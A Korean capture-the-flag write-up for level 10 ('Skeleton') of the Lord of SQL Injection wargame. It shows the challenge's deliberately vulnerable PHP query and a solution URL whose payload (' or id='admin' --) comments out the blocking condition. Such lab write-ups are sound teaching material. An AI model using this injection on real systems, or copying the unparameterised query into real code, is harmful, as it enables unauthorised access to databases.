# Lord of SQL Injection No.10 Skeleton

Skeleton 문제는 문제 풀이에 방해되는 조건절을 무력화시켜 원하는 `id`값을 입력하도록 유도한 문제이다.

## 소스 코드
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```

```php
$query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0";
```

`$_GET` 방식으로 `pw`를 입력받은 후에 `and 1=0`으로 query를 항상 False로 만든다.
즉, 문제를 풀기 위해서는 `and 1=0`과 같이 문제 풀이에 필요하지 않은 조건절을 무력화 해야한다.

#### 문제 풀이 조건

```php
if($result['id'] == 'admin') solve("skeleton");
```

query문의 id값은 `guest`지만 `id`값을 `admin`으로 바꾸어주면 문제풀이에 성공하게 된다.

## Solution

```
http://los.eagle-jump.org/skeleton_***.php?pw=%27%20or%20id=%27admin%27%20--%20;
```

`pw`문을 `'`로 닫아준 후 `or id='admin'`으로 `id`값을 문제 풀이 조건에 맞게 `admin`으로 지정하준다.
후에 나오는 `pw` 입력문과 `and 1=0` 조건절은 문제를 푸는 데에 걸림돌만 되기 때문에 `--` 주석처리로 무력화시킨다.
문제 풀이에 필요한 `id`값을 맞추어 주고 필요하지 않은 조건절을 무력화시키면 문제 풀이에 성공하게 된다.